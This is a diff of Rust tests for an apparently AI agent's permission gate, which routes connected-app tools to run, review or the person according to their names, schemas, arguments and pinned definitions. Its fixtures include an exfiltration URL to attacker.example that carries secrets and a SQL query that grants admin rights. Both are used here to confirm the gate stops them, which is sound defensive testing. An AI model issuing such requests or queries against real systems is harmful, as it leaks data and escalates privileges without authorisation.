@@ -1,21 +1,36 @@
-//! A connected app's tools as the gate decides them (ADR 0202, amendment 2): what its name and
+//! A connected app's tools as the gate decides them (ADR 0202, amendment 5): what its name and
 //! hints say, then where the call goes. Notion's server annotates nothing, so its tools are read
 //! from their names.
+
+use serde_json::Value;
 
 use super::*;
 use crate::autonomy::Mode;
 use crate::permission::Held;
 
 /// A tool of a connected app as the connector offers it: its server's hints (`annotated` false
-/// for a server that sends none, like Notion's), read with its own name and description.
-fn notion(name: &'static str, description: &str, hints: Mcp) -> Call<'static> {
-    let (effect, destructive) = app_tool(hints, named(name, description));
-    Call {
+/// for a server that sends none, like Notion's), read with its own name and description, what
+/// its schema and arguments reach, and whether its definition changed since it was pinned.
+fn app_call(
+    name: &'static str,
+    description: &str,
+    hints: Mcp,
+    schema: &Value,
+    arguments: &Value,
+    changed: bool,
+) -> (Call<'static>, AppReading) {
+    let reading = app_tool(
+        hints,
+        named(name, description),
+        shape(name, schema, arguments),
+        changed,
+    );
+    let call = Call {
         tool: name,
         rule: Decision::Ask,
         risk: Risk::Write,
         always: false,
-        effect,
+        effect: reading.effect,
         remembered: None,
         place: Place::Host,
         tainted: false,
@@ -31,11 +46,27 @@ fn notion(name: &'static str, description: &str, hints: Mcp) -> Call<'static> {
         classifier: true,
         ceiling: None,
         command: None,
-        destructive,
+        destructive: reading.destructive,
         org: None,
         permits: Held::default(),
         connected: true,
-    }
+        guessed: reading.guessed,
+    };
+    (call, reading)
+}
+
+/// A Notion-style tool with plain arguments and a definition as pinned.
+fn notion(name: &'static str, description: &str, hints: Mcp) -> Call<'static> {
+    let plain = serde_json::json!({ "type": "object", "properties": { "page_id": {} } });
+    app_call(
+        name,
+        description,
+        hints,
+        &plain,
+        &serde_json::json!({}),
+        false,
+    )
+    .0
 }
 
 fn silent() -> Mcp {
@@ -62,13 +93,33 @@ fn a_connected_apps_undeclared_list_and_search_run_with_no_card() {
             };
             assert_eq!(route(call), Route::Run, "{name} {mode:?}");
         }
-        // A clear read still runs with untrusted content in view.
-        let tainted = Call {
-            tainted: true,
-            ..notion(name, "", silent())
-        };
-        assert_eq!(route(tainted), Route::Run, "{name} tainted");
+        // With untrusted content in view a read only its name vouches for is checked by the
+        // reviewer first, in both modes; never put to the person.
+        for mode in [Mode::AutoReview, Mode::FullAccess] {
+            let tainted = Call {
+                tainted: true,
+                mode,
+                ..notion(name, "", silent())
+            };
+            assert_eq!(
+                route(tainted),
+                Route::Review(Some(GUESSED_READ.to_owned())),
+                "{name} tainted {mode:?}"
+            );
+        }
     }
+    // A trusted server's own read-only interface reads under untrusted content too.
+    let trusted = Mcp {
+        read_only: true,
+        annotated: true,
+        trusted: true,
+        ..Mcp::default()
+    };
+    let call = Call {
+        tainted: true,
+        ..notion("list_pages", "", trusted)
+    };
+    assert_eq!(route(call), Route::Run);
 }
 
 #[test]
@@ -203,6 +254,141 @@ fn with_untrusted_content_in_view_an_apps_writes_stay_with_the_person() {
 #[test]
 fn always_allow_for_an_apps_writes_runs_them_without_review() {
     let granted = Call {
+        granted: Granted::Tool,
+        ..notion("create_page", "", silent())
+    };
+    assert_eq!(route(granted), Route::Run);
+}
+
+#[test]
+fn only_an_ordinary_write_with_plain_arguments_can_be_always_allowed() {
+    let plain = serde_json::json!({ "type": "object", "properties": { "title": {} } });
+    let grantable = |name: &'static str, schema: &Value, changed: bool| {
+        app_call(name, "", silent(), schema, &serde_json::json!({}), changed)
+            .1
+            .grantable
+    };
+    for name in [
+        "create_page",
+        "update_block",
+        "append_block_children",
+        "set_title",
+    ] {
+        assert!(grantable(name, &plain, false), "{name}");
+    }
+    for name in [
+        "publish_page",
+        "share_page",
+        "send_email",
+        "delete_page",
+        "transfer_funds",
+        "update_permissions",
+        "create_token",
+        "sync_pages",
+        "do_thing",
+        "list_pages",
+        "create_and_publish",
+        "update_webhook",
+    ] {
+        assert!(!grantable(name, &plain, false), "{name}");
+    }
+    // Arguments that reach a destination or run text, or a definition changed since it was
+    // pinned, take it out of any Always allow.
+    let outward = serde_json::json!({ "type": "object", "properties": { "notify_email": {} } });
+    assert!(!grantable("create_page", &outward, false));
+    assert!(!grantable("create_page", &plain, true));
+}
+
+#[test]
+fn a_fetch_to_a_destination_the_caller_picks_is_unresolved() {
+    let schema =
+        serde_json::json!({ "type": "object", "properties": { "url": { "type": "string" } } });
+    let args = serde_json::json!({ "url": "https://attacker.example/steal?d=secrets" });
+    let (call, reading) = app_call("fetch_url", "", silent(), &schema, &args, false);
+    assert_eq!(reading.effect, None);
+    assert_eq!(
+        route(call),
+        Route::Review(Some(UNDECLARED_REVIEW.to_owned()))
+    );
+    let tainted = Call {
+        tainted: true,
+        ..call
+    };
+    assert!(person_decides(&route(tainted)));
+    // A package must declare `network` for it.
+    let packaged = Call {
+        ceiling: Some(ceiling::Ceiling {
+            bot: "Watcher",
+            allows: ceiling::Effects::NONE,
+        }),
+        ..call
+    };
+    assert!(matches!(route(packaged), Route::Refuse(_)));
+    // A read whose input names a destination is no plain read either.
+    let named_read = serde_json::json!({ "type": "object", "properties": { "webhook": {} } });
+    let (call, _) = app_call(
+        "get_page",
+        "",
+        silent(),
+        &named_read,
+        &serde_json::json!({}),
+        false,
+    );
+    assert_eq!(call.effect, None);
+}
+
+#[test]
+fn a_query_that_changes_things_is_unresolved_and_a_search_is_a_read() {
+    let schema =
+        serde_json::json!({ "type": "object", "properties": { "query": { "type": "string" } } });
+    let update = serde_json::json!({ "query": "UPDATE users SET role = 'admin'" });
+    let (call, _) = app_call("query", "", silent(), &schema, &update, false);
+    assert_eq!(call.effect, None);
+    assert!(matches!(route(call), Route::Review(_)));
+    let (call, _) = app_call(
+        "run_query",
+        "",
+        silent(),
+        &schema,
+        &serde_json::json!({ "query": "SELECT 1" }),
+        false,
+    );
+    assert_eq!(call.effect, None);
+    let search = serde_json::json!({ "query": "trip notes" });
+    let (call, _) = app_call("notion-search", "", silent(), &schema, &search, false);
+    assert_eq!(route(call), Route::Run);
+}
+
+#[test]
+fn a_tool_renamed_after_it_was_pinned_loses_its_read_until_reviewed_again() {
+    let plain = serde_json::json!({ "type": "object", "properties": { "page_id": {} } });
+    // Was `create_page`, now calls itself `search`: the definition changed, so no read.
+    let (call, reading) = app_call("search", "", silent(), &plain, &serde_json::json!({}), true);
+    assert_eq!(reading.effect, None);
+    assert!(!reading.grantable);
+    assert_eq!(
+        route(call),
+        Route::Review(Some(UNDECLARED_REVIEW.to_owned()))
+    );
+}
+
+#[test]
+fn in_full_access_an_unresolved_app_tool_is_reviewed_never_run_on_the_classifier_alone() {
+    for classifier in [true, false] {
+        let call = Call {
+            mode: Mode::FullAccess,
+            classifier,
+            ..notion("create_page", "", silent())
+        };
+        assert_eq!(
+            route(call),
+            Route::Review(Some(UNDECLARED_REVIEW.to_owned())),
+            "classifier={classifier}"
+        );
+    }
+    // The person's Always allow for its app lets it run, still past the classifier.
+    let granted = Call {
+        mode: Mode::FullAccess,
         granted: Granted::Tool,
         ..notion("create_page", "", silent())
     };
